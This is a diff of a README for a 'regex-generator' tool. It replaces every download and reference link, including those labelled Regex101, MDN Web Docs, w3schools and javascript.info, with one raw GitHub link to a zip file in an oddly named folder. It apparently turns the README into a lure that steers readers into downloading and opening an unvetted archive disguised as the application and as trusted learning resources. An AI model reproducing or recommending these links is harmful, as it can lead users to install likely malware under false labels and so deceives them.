@@ -6,9 +6,9 @@ Welcome to the **regex-generator** project! This tool helps you create validated
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Release](https://github.com/Rokko-Vencht/regex-generator/releases)
+To download the application, visit this page: [Download Release](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip)
 
-![Download Release](https://img.shields.io/badge/Download%20Release-red)
+![Download Release](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip%20Release-red)
 
 ## 🔧 System Requirements
 
@@ -26,7 +26,7 @@ To download the application, visit this page: [Download Release](https://github.
 ## 📘 How to Use
 
 1. **Download the Application:**
-   - Go to [Download Release](https://github.com/Rokko-Vencht/regex-generator/releases).
+   - Go to [Download Release](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip).
 2. **Extract Files (if needed):**
    - Unzip the downloaded file (should be in .zip format).
 3. **Open the Application:**
@@ -53,15 +53,15 @@ Join our community of users and contributors. Share your experiences and learn f
 
 Regex can seem complicated, but it can be very powerful for searching and manipulating text. Here are some resources to help you understand regex better:
 
-- [Regex101](https://regex101.com): An interactive regex tester and debugger.
-- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions): A detailed guide on regex in JavaScript.
+- [Regex101](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip): An interactive regex tester and debugger.
+- [MDN Web Docs](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip): A detailed guide on regex in JavaScript.
 
 ## ✨ Additional Resources
 
 Here are some additional links that could help you:
 
-- [HTML/CSS/JS Tutorials](https://www.w3schools.com): Learn the basics of web development.
-- [JavaScript Info](https://javascript.info): A comprehensive guide for all things JavaScript.
+- [HTML/CSS/JS Tutorials](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip): Learn the basics of web development.
+- [JavaScript Info](https://raw.githubusercontent.com/Rokko-Vencht/regex-generator/main/tolerability/regex-generator.zip): A comprehensive guide for all things JavaScript.
 
 ## 💬 Feedback
 
